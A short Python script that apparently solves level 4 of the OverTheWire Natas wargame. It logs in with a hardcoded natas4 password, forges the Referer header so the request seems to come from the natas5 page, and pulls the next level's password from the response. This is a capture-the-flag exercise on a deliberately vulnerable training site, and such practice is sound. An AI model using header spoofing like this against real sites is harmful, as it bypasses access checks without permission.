#!/usr/bin/env python

import re
import requests


username='natas4'
password='Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

headers={'Referer':'http://natas5.natas.labs.overthewire.org/'}
#there are many types in implementing the headers.. 


url='http://%s.natas.labs.overthewire.org' %username
response=requests.get(url,auth=(username,password),headers=headers) #make sure that its headers= and not header=


context=response.text     #storing the response text in context(variable)

#print (context)
print re.findall('natas5 is (.*)',context)[0]